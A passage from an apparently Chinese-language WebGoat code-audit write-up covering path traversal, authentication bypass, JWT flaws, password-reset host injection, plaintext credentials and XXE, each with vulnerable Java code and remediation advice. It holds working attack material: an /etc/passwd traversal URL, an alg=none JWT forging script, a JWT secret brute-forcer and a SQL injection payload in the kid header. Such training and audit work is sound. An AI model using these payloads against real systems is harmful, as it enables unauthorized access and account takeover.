</span>&#123;        <span class=\"keyword\">return</span> <span class=\"keyword\">super</span>.execute(file, fullName != <span class=\"keyword\">null</span> ? fullName.replace(<span class=\"string\">&quot;../&quot;</span>, <span class=\"string\">&quot;&quot;</span>) : <span class=\"string\">&quot;&quot;</span>);    &#125;</span><br></pre></td></tr></table></figure>\n<p>测试截图：</p>\n<p><img src=\"pt03.png\" alt=\"\"></p>\n<p><img src=\"pt04.png\" alt=\"\"></p>\n<ol start=\"3\">\n<li>path-traversal–&gt;ProfileUploadRemoveUserInput</li>\n</ol>\n<p>直接使用了源文件名，所以直接修改文件名即可，建议随机重命名文件名</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> AttackResult <span class=\"title\">uploadFileHandler</span><span class=\"params\">(<span class=\"meta\">@RequestParam(&quot;uploadedFileRemoveUserInput&quot;)</span> MultipartFile file)</span> </span>&#123;        <span class=\"keyword\">return</span> <span class=\"keyword\">super</span>.execute(file, file.getOriginalFilename());    &#125;</span><br></pre></td></tr></table></figure>\n<p>测试截图：</p>\n<p><img src=\"pt05.png\" alt=\"\"></p>\n<p><img src=\"pt06.png\" alt=\"\"></p>\n<h1 id=\"目录遍历\"><a class=\"markdownIt-Anchor\" href=\"#目录遍历\">#</a> 目录遍历</h1>\n<h2 id=\"漏洞描述-3\"><a class=\"markdownIt-Anchor\" href=\"#漏洞描述-3\">#</a> 漏洞描述</h2>\n<p>路径遍历，即利用路径回溯符 “…/” 跳出程序本身的限制目录实现下载任意文件。例如 Web 应用源码目录、Web 应用配置文件、敏感的系统文件（/etc/passwd、/etc/paswd）等。</p>\n<p>一个正常的 Web 功能请求：</p>\n<p><a href=\"http://www.test.com/get-files.jsp?file=report.pdf\">http://www.test.com/get-files.jsp?file=report.pdf</a></p>\n<p>如果 Web 应用存在路径遍历漏洞，则攻击者可以构造以下请求服务器敏感文件：</p>\n<p><a href=\"http://www.test.com/get-files.jsp?file=../../../../../../../../../../../../etc/passwd\">http://www.test.com/get-files.jsp?file=../../../../../../../../../../../../etc/passwd</a></p>\n<h2 id=\"漏洞成因-3\"><a class=\"markdownIt-Anchor\" href=\"#漏洞成因-3\">#</a> 漏洞成因</h2>\n<p>未对用户输入的参数进行合法性验证</p>\n<h2 id=\"代码片段以及修复建议-3\"><a class=\"markdownIt-Anchor\" href=\"#代码片段以及修复建议-3\">#</a> 代码片段以及修复建议</h2>\n<p>path-traversal–&gt;ProfileUploadRetrieval</p>\n<p>源码过滤了’…‘和’/’，但是可以通过 url 编码进行绕过</p>\n<p>根据参数 id 进行判断</p>\n<p><img src=\"pt08.png\" alt=\"\"></p>\n<p>如果用户输入的 id.jpg 存在，那么返回包中返回该图片的 base64 编码</p>\n<p>如果不存在，就返回 catPicturesDirectory 的父目录的所有文件信息，用逗号分割</p>\n<p><img src=\"pt09.png\" alt=\"\"></p>\n<p>测试截图：</p>\n<p><img src=\"pt07.png\" alt=\"\"></p>\n<p>修复建议：</p>\n<pre><code>1. 使用适当的权限保护文件夹2. 禁止返回目录信息3. 对url编码后的参数也要进行解码过滤4. 统一404界面\n</code></pre>\n<h1 id=\"身份认证绕过\"><a class=\"markdownIt-Anchor\" href=\"#身份认证绕过\">#</a> 身份认证绕过</h1>\n<h2 id=\"漏洞描述-4\"><a class=\"markdownIt-Anchor\" href=\"#漏洞描述-4\">#</a> 漏洞描述</h2>\n<p>业务流程由前端进行控制，服务器端对应的各功能分离，导致业务流程可被攻击者进行控制，从而绕过流程中的各项校验功能，达到攻击的目的。</p>\n<h2 id=\"漏洞成因-4\"><a class=\"markdownIt-Anchor\" href=\"#漏洞成因-4\">#</a> 漏洞成因</h2>\n<p>未对用户可控的参数进行合法性验证</p>\n<h2 id=\"代码片段以及修复建议-4\"><a class=\"markdownIt-Anchor\" href=\"#代码片段以及修复建议-4\">#</a> 代码片段以及修复建议</h2>\n<ol>\n<li>\n<p>auth-bypass–&gt;VerifyAccount.completed()</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (verificationHelper.didUserLikelylCheat((HashMap) submittedAnswers)) &#123;            <span class=\"keyword\">return</span> failed(<span class=\"keyword\">this</span>)                    .feedback(<span class=\"string\">&quot;verify-account.cheated&quot;</span>)                    .output(<span class=\"string\">&quot;Yes, you guessed correctly, but see the feedback message&quot;</span>)                    .build();        &#125;</span><br></pre></td></tr></table></figure>\n<p>调用 verificationHelper.didUserLikelylCheat ()</p>\n<p>将用户输入的问题用键值对的方式保存，并和后端代码存储的答案进行比较。</p>\n<p>但是 Mapper 在 get 一个不存在的键时，并不会报错，而是返回 null。所以用户可以通过控制 key 的值绕过。</p>\n<p>建议</p>\n<ol>\n<li>若用户可控 key，那么应该先判断这个 key 是否合法</li>\n<li>设置不可控 key，直接将用户的输入作为 value 进行判断</li>\n</ol>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">static</span> &#123;        userSecQuestions.put(<span class=\"string\">&quot;secQuestion0&quot;</span>, <span class=\"string\">&quot;Dr. Watson&quot;</span>);        userSecQuestions.put(<span class=\"string\">&quot;secQuestion1&quot;</span>, <span class=\"string\">&quot;Baker Street&quot;</span>);    &#125;    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> Map&lt;Integer, Map&gt; secQuestionStore = <span class=\"keyword\">new</span> HashMap&lt;&gt;();    <span class=\"keyword\">static</span> &#123;        secQuestionStore.put(verifyUserId, userSecQuestions);    &#125;    <span class=\"comment\">// end &#x27;data store set up&#x27;    // this is to aid feedback in the attack process and is not intended to be part of the &#x27;vulnerable&#x27; code    public boolean didUserLikelylCheat(HashMap&lt;String, String&gt; submittedAnswers) &#123;        boolean likely = false;        if (submittedAnswers.size() == secQuestionStore.get(verifyUserId).size()) &#123;            likely = true;        &#125;        if ((submittedAnswers.containsKey(&quot;secQuestion0&quot;) &amp;&amp; submittedAnswers.get(&quot;secQuestion0&quot;).equals(secQuestionStore.get(verifyUserId).get(&quot;secQuestion0&quot;)))                &amp;&amp; (submittedAnswers.containsKey(&quot;secQuestion1&quot;) &amp;&amp; submittedAnswers.get(&quot;secQuestion1&quot;).equals(secQuestionStore.get(verifyUserId).get(&quot;secQuestion1&quot;)))) &#123;            likely = true;        &#125; else &#123;            likely = false;        &#125;        return likely;</span></span><br></pre></td></tr></table></figure>\n<p>测试截图：</p>\n<p><img src=\"ap01.png\" alt=\"\"></p>\n</li>\n<li>\n<p>auth-bypass–&gt;AccountVerificationHelper.verifyAccount()</p>\n<p>判断了 key 是否存在，但是不包含该 key 仍然可以绕过</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//end of cheating check ... the method below is the one of real interest. Can you find the flaw?    public boolean verifyAccount(Integer userId, HashMap&lt;String, String&gt; submittedQuestions) &#123;        //short circuit if no questions are submitted        if (submittedQuestions.entrySet().size() != secQuestionStore.get(verifyUserId).size()) &#123;            return false;        &#125;        if (submittedQuestions.containsKey(&quot;secQuestion0&quot;) &amp;&amp; !submittedQuestions.get(&quot;secQuestion0&quot;).equals(secQuestionStore.get(verifyUserId).get(&quot;secQuestion0&quot;))) &#123;            return false;        &#125;        if (submittedQuestions.containsKey(&quot;secQuestion1&quot;) &amp;&amp; !submittedQuestions.get(&quot;secQuestion1&quot;).equals(secQuestionStore.get(verifyUserId).get(&quot;secQuestion1&quot;))) &#123;            return false;        &#125;        // else        return true;    &#125;</span></span><br></pre></td></tr></table></figure>\n<p>建议修改为</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (submittedQuestions.entrySet().size() != secQuestionStore.get(verifyUserId).size()) &#123;            <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;        &#125;<span class=\"comment\">// 同时判断key和对应的value        if (submittedQuestions.containsKey(&quot;secQuestion0&quot;) &amp;&amp; submittedQuestions.get(&quot;secQuestion0&quot;).equals(secQuestionStore.get(verifyUserId).get(&quot;secQuestion0&quot;)) &amp;&amp; submittedQuestions.containsKey(&quot;secQuestion1&quot;) &amp;&amp; submittedQuestions.get(&quot;secQuestion1&quot;).equals(secQuestionStore.get(verifyUserId).get(&quot;secQuestion1&quot;))) &#123;            return true;        &#125;        // else        return false;</span></span><br></pre></td></tr></table></figure>\n<p>作者没写这个功能点，就是在源码里面问了一下</p>\n</li>\n<li>\n<p>JWT</p>\n<p>jwt–&gt;JWTVotesEndpoint.vote()</p>\n<p>没有验证签名，直接判断 token 中的 admin 对应值是否为 true，所以把 token 中的 alg 设置为 none，admin 设置为 true 即可（亲测 bp 转换的不行）</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (StringUtils.isEmpty(accessToken)) &#123;            <span class=\"keyword\">return</span> failed(<span class=\"keyword\">this</span>).feedback(<span class=\"string\">&quot;jwt-invalid-token&quot;</span>).build();        &#125; <span class=\"keyword\">else</span> &#123;            <span class=\"keyword\">try</span> &#123;                Jwt jwt = Jwts.parser().setSigningKey(JWT_PASSWORD).parse(accessToken);                Claims claims = (Claims) jwt.getBody();                <span class=\"keyword\">boolean</span> isAdmin = Boolean.valueOf((String) claims.get(<span class=\"string\">&quot;admin&quot;</span>));                <span class=\"keyword\">if</span> (!isAdmin) &#123;                    <span class=\"keyword\">return</span> failed(<span class=\"keyword\">this</span>).feedback(<span class=\"string\">&quot;jwt-only-admin&quot;</span>).build();                &#125; <span class=\"keyword\">else</span> &#123;                    votes.values().forEach(vote -&gt; vote.reset());                    <span class=\"keyword\">return</span> success(<span class=\"keyword\">this</span>).build();                &#125;            &#125; <span class=\"keyword\">catch</span> (JwtException e) &#123;                <span class=\"keyword\">return</span> failed(<span class=\"keyword\">this</span>).feedback(<span class=\"string\">&quot;jwt-invalid-token&quot;</span>).output(e.toString()).build();            &#125;        &#125;</span><br></pre></td></tr></table></figure>\n<p>转换脚本：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding:utf-8 -*-import jwtimport base64# header# eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9# &#123;&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;HS256&quot;&#125;#payload eyJpc3MiOiJodHRwOlwvXC9kZW1vLnNqb2VyZGxhbmdrZW1wZXIubmxcLyIsImlhdCI6MTUwNDAwNjQzNSwiZXhwIjoxNTA0MDA2NTU1LCJkYXRhIjp7ImhlbGxvIjoid29ybGQifX0# &#123;&quot;iss&quot;:&quot;http:\\/\\/demo.sjoerdlangkemper.nl\\/&quot;,&quot;iat&quot;:1504006435,&quot;exp&quot;:1504006555,&quot;data&quot;:&#123;&quot;hello&quot;:&quot;world&quot;&#125;&#125;def b64urlencode(data):    return base64.b64encode(data).replace(b&#x27;+&#x27;, b&#x27;-&#x27;).replace(b&#x27;/&#x27;, b&#x27;_&#x27;).replace(b&#x27;=&#x27;, b&#x27;&#x27;)print(b64urlencode(b&#x27;&#123;&quot;alg&quot;:&quot;none&quot;&#125;&#x27;)+b&#x27;.&#x27;+b64urlencode(b&#x27;&#123;&quot;iat&quot;:1673470025,&quot;admin&quot;:&quot;true&quot;,&quot;user&quot;:&quot;Tom&quot;&#125;&#x27;)+b&#x27;.&#x27;)</span></span><br></pre></td></tr></table></figure>\n<p>测试截图：</p>\n<p><img src=\"pt10.png\" alt=\"\"></p>\n<p>jwt–&gt;JWTSecretKeyEndpoint.login()</p>\n<p>随机取数组中的值进行加密，可以用字典进行爆破</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> String[] SECRETS = &#123;<span class=\"string\">&quot;victory&quot;</span>, <span class=\"string\">&quot;business&quot;</span>, <span class=\"string\">&quot;available&quot;</span>, <span class=\"string\">&quot;shipping&quot;</span>, <span class=\"string\">&quot;washington&quot;</span>&#125;;<span class=\"keyword\">static</span> <span class=\"keyword\">final</span> String JWT_SECRET = TextCodec.BASE64.encode(SECRETS[<span class=\"keyword\">new</span> Random().nextInt(SECRETS.length)]);<span class=\"function\"><span class=\"keyword\">public</span> String <span class=\"title\">getSecretToken</span><span class=\"params\">()</span> </span>&#123;        <span class=\"keyword\">return</span> Jwts.builder()                .setIssuer(<span class=\"string\">&quot;WebGoat Token Builder&quot;</span>)                .setAudience(<span class=\"string\">&quot;webgoat.org&quot;</span>)                .setIssuedAt(Calendar.getInstance().getTime())                .setExpiration(Date.from(Instant.now().plusSeconds(<span class=\"number\">60</span>)))                .setSubject(<span class=\"string\">&quot;tom@webgoat.org&quot;</span>)                .claim(<span class=\"string\">&quot;username&quot;</span>, <span class=\"string\">&quot;Tom&quot;</span>)                .claim(<span class=\"string\">&quot;Email&quot;</span>, <span class=\"string\">&quot;tom@webgoat.org&quot;</span>)                .claim(<span class=\"string\">&quot;Role&quot;</span>, <span class=\"keyword\">new</span> String[]&#123;<span class=\"string\">&quot;Manager&quot;</span>, <span class=\"string\">&quot;Project Administrator&quot;</span>&#125;)                .signWith(SignatureAlgorithm.HS256, JWT_SECRET).compact();    &#125;</span><br></pre></td></tr></table></figure>\n<p>爆破脚本（字典 pass.txt 用的是源码里面的数组）（如果脚本报错 jwt 找不到 jwt.exceptions，可能是 pyjwt 的问题，更新 pyjwt&gt;=1.6.4 即可，<a href=\"https://stackoverflow.com/questions/33198428/jwt-module-object-has-no-attribute-encode\">解决来源</a>）：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> termcolorimport jwtif __name__ == <span class=\"string\">&quot;__main__&quot;</span>:    jwt_str = <span class=\"string\">&#x27;eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJhdWQiOiJ3ZWJnb2F0Lm9yZyIsImlhdCI6MTYxMTc5ODAxNSwiZXhwIjoxNjExNzk4MDc1LCJzdWIiOiJ0b21Ad2ViZ29hdC5vcmciLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQub3JnIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJhdG9yIl19.w1tzWDwmZcggbyV9ixcw1Vydf07MG9mAsPVbQPgBh2E&#x27;</span>    <span class=\"function\">with <span class=\"title\">open</span><span class=\"params\">(<span class=\"string\">&#x27;pass.txt&#x27;</span>)</span> as f:        <span class=\"keyword\">for</span> line in f:            key_ </span>= line.strip()            <span class=\"keyword\">try</span>:                jwt.decode(jwt_str, verify=True, key=key_, algorithms=<span class=\"string\">&quot;HS256&quot;</span>)                print(<span class=\"string\">&#x27;\\r&#x27;</span>, <span class=\"string\">&#x27;\\bbingo! found key --&gt;&#x27;</span>, termcolor.colored(key_, <span class=\"string\">&#x27;green&#x27;</span>), <span class=\"string\">&#x27;&lt;--&#x27;</span>)                <span class=\"function\"><span class=\"keyword\">break</span>            <span class=\"title\">except</span> <span class=\"params\">(jwt.exceptions.ExpiredSignatureError, jwt.exceptions.InvalidAudienceError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.ImmatureSignatureError)</span>:                <span class=\"title\">print</span><span class=\"params\">(<span class=\"string\">&#x27;\\r&#x27;</span>, <span class=\"string\">&#x27;\\bbingo! found key --&gt;&#x27;</span>, termcolor.colored(key_, <span class=\"string\">&#x27;green&#x27;</span>)</span>, &#x27;&lt;--&#x27;)                <span class=\"keyword\">break</span>            except jwt.exceptions.InvalidSignatureError:                <span class=\"title\">print</span><span class=\"params\">(<span class=\"string\">&#x27;\\r&#x27;</span>, <span class=\"string\">&#x27; &#x27;</span> * <span class=\"number\">64</span>, <span class=\"string\">&#x27;\\r\\btry&#x27;</span>, key_, end=<span class=\"string\">&#x27;&#x27;</span>, flush=True)</span>                <span class=\"keyword\">continue</span>        <span class=\"keyword\">else</span>:            <span class=\"title\">print</span><span class=\"params\">(<span class=\"string\">&#x27;\\r&#x27;</span>, <span class=\"string\">&#x27;\\bsorry! no key be found.&#x27;</span>)</span></span></span><br></pre></td></tr></table></figure>\n<p>测试截图：</p>\n<p><img src=\"pt12.png\" alt=\"\"></p>\n<p>爆破出来 key，就可以去 https://jwt.io/#debugger 加工啦</p>\n<p><img src=\"pt13.png\" alt=\"\"></p>\n<p>jwt–&gt;JWTRefreshEndpoint</p>\n<p>登录时调用 createNewTokens ()</p>\n<p>会获取到的 refresh token 和该用户的 access token</p>\n<p>refresh token 是通过 RandomStringUtils.randomAlphabetic (20) 获取的随机值，用于刷新过期的 access token</p>\n<p>但是由于没有绑定用户信息，所以可以用来刷新任何任何用户的过期 token</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Map&lt;String, Object&gt; tokenJson = <span class=\"keyword\">new</span> HashMap&lt;&gt;();        String refreshToken = RandomStringUtils.randomAlphabetic(<span class=\"number\">20</span>);        validRefreshTokens.add(refreshToken);        tokenJson.put(<span class=\"string\">&quot;access_token&quot;</span>, token);        tokenJson.put(<span class=\"string\">&quot;refresh_token&quot;</span>, refreshToken);        <span class=\"keyword\">return</span> tokenJson;</span><br></pre></td></tr></table></figure>\n<p>token 刷新，请求包中的 refresh_token 被包含在随机生成的 token 集合中时，就返回一个新的 token：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (user == <span class=\"keyword\">null</span> || refreshToken == <span class=\"keyword\">null</span>) &#123;            <span class=\"keyword\">return</span> ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();        &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (validRefreshTokens.contains(refreshToken)) &#123;            validRefreshTokens.remove(refreshToken);            <span class=\"keyword\">return</span> ok(createNewTokens(user));        &#125; <span class=\"keyword\">else</span> &#123;            <span class=\"keyword\">return</span> ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();        &#125;</span><br></pre></td></tr></table></figure>\n<p>测试截图：</p>\n<p>利用登录接口，登录当前用户 jerry，获取刷新 refresh_token</p>\n<p><img src=\"pt14.png\" alt=\"\"></p>\n<p>没有成功刷新 token，报错信息：给出的 token 无法正常解析</p>\n<p>jwt–&gt;JWTFinalEndpoint.resetVotes()</p>\n<p>存在 sql 注入点 &quot;kid&quot;(KID 代表 “密钥序号”（Key ID）。它是 JWT 头部的一个可选字段，开发人员可以用它标识认证 token 的某一密钥)</p>\n<p>可以通过 union 进行绕过，将 &quot;key&quot; 作为认证密钥，使用<a href=\"https://jwt.io/#debugger\">在线工具</a>伪造 token</p>\n<p>这里将数据库取出的 key 用 base64 解码了，所以在注入的时候要注入 key 的 base 编码</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">aaa<span class=\"string\">&#x27; union select &#x27;</span>a2V5<span class=\"string\">&#x27; from jwt_keys where id=&#x27;</span>webgoat_key</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">final</span> String kid = (String) header.get(<span class=\"string\">&quot;kid&quot;</span>);                        <span class=\"keyword\">try</span> (<span class=\"keyword\">var</span> connection = dataSource.getConnection()) &#123;                            ResultSet rs = connection.createStatement().executeQuery(<span class=\"string\">&quot;SELECT key FROM jwt_keys WHERE id = &#x27;&quot;</span> + kid + <span class=\"string\">&quot;&#x27;&quot;</span>);                            <span class=\"keyword\">while</span> (rs.next()) &#123;                                <span class=\"keyword\">return</span> TextCodec.BASE64.decode(rs.getString(<span class=\"number\">1</span>));                            &#125;                        &#125;</span><br></pre></td></tr></table></figure>\n<p>建议</p>\n<ol>\n<li>保证密钥的保密性</li>\n<li>签名算法固定在后端，不以 JWT 里的算法为标准</li>\n<li>避免敏感信息保存在 JWT 中</li>\n<li>尽量 JWT 的有效时间足够短</li>\n<li>尽量避免用用户可以获取的参数刷新 token，避免逻辑绕过</li>\n<li>注意 header 部分，若有 sql 语句，建议使用预编译</li>\n</ol>\n<p>测试截图：</p>\n<p>a2v5 是 key 的 base64 编码</p>\n<p><img src=\"pt15.png\" alt=\"\"></p>\n<p><img src=\"pt16.png\" alt=\"\"></p>\n</li>\n<li>\n<p>安全问题</p>\n<p>password_reset–&gt;QuestionsAssignment</p>\n<p>密保问题设置为，你最喜欢的颜色是什么，可以直接用常见颜色生成字典进行爆破，建议使用更复杂的难以破解的问题，并且限制输入次数</p>\n<p><img src=\"ba01.png\" alt=\"\"></p>\n<p>测试截图：</p>\n<p><img src=\"pt17.png\" alt=\"\"></p>\n<p>password_reset–&gt;ResetLinkAssignmentForgotPassword</p>\n<p>参数 host 是从 Request 头部获取的，可以通过控制 host 参数，给用户发送一个我们控制的 link，用户点击后访问我们的服务器，服务器记录该请求，从而获取到后面的 resetLink，然后我们再通过正常的访问修改密码</p>\n</li>\n</ol>\n<p>修复建议：</p>\n<pre><code>1. 禁止将用户可控的参数拼接进密码重置link2. 重置链接应该是一次性有效的\n</code></pre>\n   <figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title\">fakeClickingLinkEmail</span><span class=\"params\">(String host, String resetLink)</span> </span>&#123;        <span class=\"keyword\">try</span> &#123;            HttpHeaders httpHeaders = <span class=\"keyword\">new</span> HttpHeaders();            HttpEntity httpEntity = <span class=\"keyword\">new</span> HttpEntity(httpHeaders);            <span class=\"keyword\">new</span> RestTemplate().exchange(String.format(<span class=\"string\">&quot;http://%s/PasswordReset/reset/reset-password/%s&quot;</span>, host, resetLink), HttpMethod.GET, httpEntity, Void.class);        &#125; <span class=\"keyword\">catch</span> (Exception e) &#123;         <span class=\"comment\">//don&#x27;t care        &#125;    &#125;</span></span><br></pre></td></tr></table></figure>\n<p>测试截图：</p>\n<p>攻击者服务器记录了请求</p>\n<p><img src=\"pt18.png\" alt=\"\"></p>\n<h1 id=\"用户敏感信息传输与存储\"><a class=\"markdownIt-Anchor\" href=\"#用户敏感信息传输与存储\">#</a> 用户敏感信息传输与存储</h1>\n<h2 id=\"漏洞描述-5\"><a class=\"markdownIt-Anchor\" href=\"#漏洞描述-5\">#</a> 漏洞描述</h2>\n<p>系统未对用户的敏感信息（如密码、身份证号、电话号码、银行卡号等）进行加密、脱敏等操作，导致用户信息存在泄露的风险。</p>\n<h2 id=\"漏洞成因-5\"><a class=\"markdownIt-Anchor\" href=\"#漏洞成因-5\">#</a> 漏洞成因</h2>\n<p>提交登录请求时，没有对密码进行加密</p>\n<h2 id=\"代码片段以及修复建议-5\"><a class=\"markdownIt-Anchor\" href=\"#代码片段以及修复建议-5\">#</a> 代码片段以及修复建议</h2>\n<p>前端存储的用户名和密码</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">submit_secret_credentials</span>(<span class=\"params\"></span>) </span>&#123;    <span class=\"keyword\">var</span> xhttp = <span class=\"keyword\">new</span> XMLHttpRequest();    xhttp[<span class=\"string\">&#x27;open&#x27;</span>](<span class=\"string\">&#x27;POST&#x27;</span>, <span class=\"string\">&#x27;#attack/307/100&#x27;</span>, <span class=\"literal\">true</span>);\t<span class=\"comment\">//sending the request is obfuscated, to descourage js reading\tvar _0xb7f9=[&quot;\\x43\\x61\\x70\\x74\\x61\\x69\\x6E\\x4A\\x61\\x63\\x6B&quot;,&quot;\\x42\\x6C\\x61\\x63\\x6B\\x50\\x65\\x61\\x72\\x6C&quot;,&quot;\\x73\\x74\\x72\\x69\\x6E\\x67\\x69\\x66\\x79&quot;,&quot;\\x73\\x65\\x6E\\x64&quot;];xhttp[_0xb7f9[3]](JSON[_0xb7f9[2]](&#123;username:_0xb7f9[0],password:_0xb7f9[1]&#125;))&#125;</span></span><br></pre></td></tr></table></figure>\n<p>调用该函数的发包截图：</p>\n<p><img src=\"se01.png\" alt=\"\"></p>\n<p>建议在数据传过程中，对用户的敏感数据进行加密</p>\n<h1 id=\"xml外部实体注入\"><a class=\"markdownIt-Anchor\" href=\"#xml外部实体注入\">#</a> XML 外部实体注入</h1>\n<h2 id=\"漏洞描述-6\"><a class=\"markdownIt-Anchor\" href=\"#漏洞描述-6\">#</a> 漏洞描述</h2>\n<p>XXE（XML External Entity Injection）是一种针对 XML 终端实施的攻击，漏洞产生的根本原因就是在 XML1.0 标准中引入了 “entity” 这个概念，且 “entity” 可以在预定义的文档中进行调用，XXE 漏洞的利用就是通过实体的标识符访问本地或者远程内容。黑客想要实施这种攻击，需要在 XML 的 payload 包含外部实体声明，且服务器本身允许实体扩展。这样的话，黑客或许能读取 WEB 服务器的文件系统，通过 UNC 路径访问远程文件系统，或者通过 HTTP/HTTPS 连接到任意主机。</p>\n<h2 id=\"漏洞成因-6\"><a class=\"markdownIt-Anchor\" href=\"#漏洞成因-6\">#</a> 漏洞成因</h2>\n<p>XML 解析没有禁止外部实体的解析，且用户可控 REST XML 格式的参数。</p>\n<h2 id=\"代码片段以及修复建议-6\"><a class=\"markdownIt-Anchor\" href=\"#代码片段以及修复建议-6\">#</a> 代码片段以及修复建议</h2>\n<ol>\n<li>\n<p>xxe–&gt;SimpleXXE.createNewComment()</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">boolean</span> secure = <span class=\"keyword\">false</span>;     \t<span class=\"keyword\">if</span> (<span class=\"keyword\">null</span> != request.getSession().getAttribute(<span class=\"string\">&quot;applySecurity&quot;</span>)) &#123;     \t\tsecure = <span class=\"keyword\">true</span>;     \t&#125;         Comment comment = comments.parseXml(commentStr, secure);         comments.addComment(comment, <span class=\"keyword\">false</span>);         <span class=\"keyword\">if</span> (checkSolution(comment)) &#123;             <span class=\"keyword\">return</span> success(<span class=\"keyword\">this</span>).build();         &#125;</span><br></pre></td></tr></table></figure>\n<p>其中调用 Comment 的 parseXml (commentStr, secure) 方法进行 xml 解析<br>\n正如代码中所示，可以通过设置 XMLConstants 的两个属性来禁用外部实体解析，默认的空字符串就是禁用，也可以指定协议等。</p>\n</li>\n</ol>\n<p>详细信息可以看 XMLConstants 中的注释。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> jc = JAXBContext.newInstance(Comment.class);     <span class=\"keyword\">var</span> xif = XMLInputFactory.newInstance();   <span class=\"keyword\">if</span> (secure) &#123;        \txif.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, <span class=\"string\">&quot;&quot;</span>); <span class=\"comment\">// Compliant     \txif.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, &quot;&quot;);  // compliant        &#125;                   var xsr = xif.createXMLStreamReader(new StringReader(xml));            var unmarshaller = jc.createUnmarshaller();        return (Comment) unmarshaller.unmarshal(xsr);</span></span><br></pre></td></tr></table></figure>\n<p>测试截图：</p>\n<p><img src=\"xxe01.png\" alt=\"\"></p>\n<ol start=\"2\">\n<li>\n<p>xxe–&gt;ContentTypeAssignment.createNewUser()</p>\n<p>根据 contentType 判断数据格式，xml 解析和 1 一样，其余同上</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 如果是xml格式        if (null != contentType &amp;&amp; contentType.contains(MediaType.APPLICATION_XML_VALUE)) &#123;            String error = &quot;&quot;;            try &#123;            \tboolean secure = false;            \tif (null != request.getSession().getAttribute(&quot;applySecurity&quot;)) &#123;            \t\tsecure = true;            \t&#125;                Comment comment = comments.parseXml(commentStr, secure);                comments.addComment(comment, false);                if (checkSolution(comment)) &#123;                    attackResult = success(this).build();                &#125;            &#125;</span></span><br></pre></td></tr></table></figure>\n<p>测试截图：</p>\n<p><img src=\"xxe02.png\" alt=\"\"></p>\n<p><img src=\"xxe03.png\" alt=\"\"></p>\n</li>\n<li>\n<p>xxe–&gt;ContentTypeAssignment.addComment()</p>\n<p>这里作者为了弄一个 blind xxe，特别设置了提交正确的内容才返回 success</p>\n<p>xml 解析代码并没有改变</p>\n<p>实际上还是通过参数实体注入（参数实体也能被外部引用），为了看到数据所以要通过盲打的方式，将 WEB 服务器的本地文件内容发送到攻击者的服务器</p>\n<p>修复建议同上</p>\n<figure class=\"highlight 